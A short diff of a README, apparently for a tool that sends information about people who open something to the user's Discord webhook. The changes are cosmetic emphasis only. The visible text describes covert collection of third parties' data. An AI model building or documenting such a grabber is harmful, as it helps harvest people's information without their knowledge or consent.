@@ -90,7 +90,7 @@ When they open it:
 
 Their info is sent to your Discord channel instantly
 
-Check your Discord channel - the data should appear
+Check your Discord channel - **the data should appear**
 
 ✅ Troubleshooting
 
@@ -102,7 +102,7 @@ Check your Discord channel - the data should appear
 
 ---
 
-## 🔒 Important Notes
+## 🔒 Important Notes!
 Keep your webhook private
 
 Use a private Discord channel
